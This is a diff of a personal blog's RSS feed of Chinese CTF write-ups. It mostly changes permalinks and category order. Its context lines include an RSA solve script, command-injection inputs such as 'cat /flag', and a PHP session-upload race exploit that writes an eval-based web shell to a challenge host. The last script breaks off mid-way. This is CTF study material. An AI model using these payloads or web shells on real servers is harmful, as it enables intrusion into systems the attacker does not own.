@@ -7,49 +7,49 @@
         <language>zh-CN</language>
         <pubDate>Fri, 25 Nov 2022 23:10:32 +0800</pubDate>
         <lastBuildDate>Fri, 25 Nov 2022 23:10:32 +0800</lastBuildDate>
-        <category>git</category>
         <category>Qt</category>
         <category>ms17</category>
         <category>msf</category>
         <category>CTF</category>
         <category>sql注入</category>
+        <category>git</category>
         <category>Misc</category>
         <category>笔记</category>
         <category>SSRF</category>
         <category>kali</category>
         <category>nmap</category>
         <category>MFC</category>
+        <category>ctfshow</category>
+        <category>Web</category>
         <category>树</category>
         <category>二叉树</category>
         <category>数据结构</category>
         <category>队列</category>
-        <category>ctfshow</category>
-        <category>Web</category>
-        <category>前缀和</category>
         <category>动态规划</category>
+        <category>前缀和</category>
         <category>滑动窗口</category>
         <category>数组</category>
         <category>哈希表</category>
         <category>链表</category>
+        <category>贪心</category>
         <category>矩阵</category>
         <category>递归</category>
-        <category>贪心</category>
         <category>子序列</category>
         <category>最长公共子序列</category>
         <category>最长回文子序列</category>
         <category>字符串</category>
-        <category>括号</category>
         <category>vector</category>
         <category>栈</category>
         <category>排列组合</category>
-        <category>双指针（快慢指针）</category>
         <category>等差数列</category>
+        <category>括号</category>
+        <category>双指针（快慢指针）</category>
         <category>深度优先搜索</category>
         <category>广度优先搜索</category>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/11/25/CTF/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/79d29fb/</guid>
             <title>菜狗杯</title>
-            <link>http://dpm12345.github.io/2022/11/25/CTF/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/</link>
+            <link>http://dpm12345.github.io/posts/79d29fb/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Fri, 25 Nov 2022 23:10:32 +0800</pubDate>
@@ -137,9 +137,9 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/11/15/CTF/Misc/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/df95b584/</guid>
             <title>Misc</title>
-            <link>http://dpm12345.github.io/2022/11/15/CTF/Misc/</link>
+            <link>http://dpm12345.github.io/posts/df95b584/</link>
             <category>CTF</category>
             <category>Misc</category>
             <pubDate>Tue, 15 Nov 2022 20:10:32 +0800</pubDate>
@@ -445,9 +445,9 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/11/15/CTF/c1game2022/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/a9a9d995/</guid>
             <title>c1game2022</title>
-            <link>http://dpm12345.github.io/2022/11/15/CTF/c1game2022/</link>
+            <link>http://dpm12345.github.io/posts/a9a9d995/</link>
             <category>CTF</category>
             <pubDate>Tue, 15 Nov 2022 20:10:32 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
@@ -495,9 +495,9 @@
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;number &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; getPrime&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;long_to_bytes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;17059805890675154693689194288904267774695041123738004404461252355931749537256504106864757370530965094729301403177401232511697113169942047001632614748389778776949621403260132175713091579361699262690831128217506233471711088592360371415138359668668902484818547836547385172564154148434043225056672605026800339316667423300334434526097239282972716203333557787747794962788217402529840470723591447060910066674822885210027210326580256141148160665377384900535203791437241675901316582327789429177275242061073379317946306640966687061512350099831125270165431703880990624613908733069252296878934985408774059475092794512523080766539&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11487335554594570987021649475033996895861564502690662533200904623601988366773443336447195985826100834897217629944003139575883637681757821764679587747075478721044189404774136037249229029289459493710718033086673062439885296483907973711438958249716545665478578954099770503221029293550688088768556291784706960084896505127785940095685156578631332394317211562782074512852427386796334826076646684317528163232691492952297031098534809070414710870459808593180155305180793487260745715684974146081936090993106941063978778822577086229724295007368109984163058792509211715433604285376229658279191540448618558457800014329092772909395&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;23012025370124001858525530093853244957679434339999937669273578422036039777773855520527043636469110937261167897590863547343322869643427039895150702808618550480113432975006416294458998153505113099153413892621239847164414531541565097716473755858423009252325247675550948653264684015712734795130932382623523765724588528898199002870851712103580147129954703380838312377896784086624933840225005006184120873346016441146985436133288195435319457419337841503406510742809073371046673340494486471363163152444298463705665684085830436750957541325210655377533803555584150491152224387025692535808304922514530476984367481961431087774359&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;17872510308468366750900256064351765382493212220388548052984754919429931114181409890152991736964952508824650784152795476748394389714643309182515750486551374017198119956515955701677543818813141696650480202802311271558301034523345129601508301061345759434656762226708537164690678445063032525080969245429169552858269926114916433320994771998685054356161887875321287410590032015722118512059386073935587280370447517416614147539732538314848984227505768894216048331935555154412118389527669413006913800783220301852193481559957930857585407219177112307272103171971681857543598200390102671514748647235215428360604828388159067909154&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x10001&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gift &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;501758996784563373343799832026596111020442385992294247190036833997992633448720709025434040309734267492038276564041212720932268034410060205930371022011464081674988864801768593403326222922402919490906797888750183337403267311540010923974657637313791249553486701074923093310710416130413036031078606030200009979894095222367729360826207044341434010233246808477013068881281940927763223238271572240888627730132340468007065521646923181402721705541823057449503355673566805765162918486297905617953784011249027996072019478705700456104256865868809914072963953455286872676573961212447731668302016003620263171125847145221780086384&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;decode1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;gift&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10001&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;gift&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ans &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; long_to_bytes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ans&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;decode2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;gift&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10001&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;gift&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    first &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; first &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2022&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;first&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; num &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; p&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ans &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; long_to_bytes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ans&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n2 &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; p&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;c1game&amp;#123;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; decode1&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;gift&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; decode2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;#125;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/10/CTF/ctfshow/Misc%E5%85%A5%E9%97%A8/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/e58b935e/</guid>
             <title>Misc入门</title>
-            <link>http://dpm12345.github.io/2022/10/10/CTF/ctfshow/Misc%E5%85%A5%E9%97%A8/</link>
+            <link>http://dpm12345.github.io/posts/e58b935e/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Mon, 10 Oct 2022 23:12:29 +0800</pubDate>
@@ -748,9 +748,9 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%86%85%E9%83%A8%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/cf9eb9c9/</guid>
             <title>内部赛</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%86%85%E9%83%A8%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/cf9eb9c9/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 23:38:40 +0800</pubDate>
@@ -867,9 +867,9 @@ PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】&
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/AK%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/b63ac8f1/</guid>
             <title>AK赛</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/AK%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/b63ac8f1/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 23:25:32 +0800</pubDate>
@@ -907,9 +907,9 @@ PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】&
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/26d2b0d0/</guid>
             <title>36D杯</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF/</link>
+            <link>http://dpm12345.github.io/posts/26d2b0d0/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 23:22:32 +0800</pubDate>
@@ -1017,9 +1017,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1&amp;#x3D;ls&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1&amp;#x3D;ls &amp;#x2F;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1&amp;#x3D;cat &amp;#x2F;flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;得到 flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF%E7%BB%83%E6%89%8B%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ba492ba4/</guid>
             <title>36D杯练手赛</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF%E7%BB%83%E6%89%8B%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/ba492ba4/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 23:20:32 +0800</pubDate>
@@ -1040,9 +1040,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; io&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; threading&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://5d6bb0b0-e82d-4a68-b50b-8fd858a7c6ea.chall.ctf.show/flflflflag.php&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sessid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vrhtvjd4j1sd88onr92fm9t2sj&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;BytesIO&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;?php system(&#39;cat *&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php @eval($_POST[cmd])?&gt;&#39;);echo md5(&#39;1&#39;);?&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            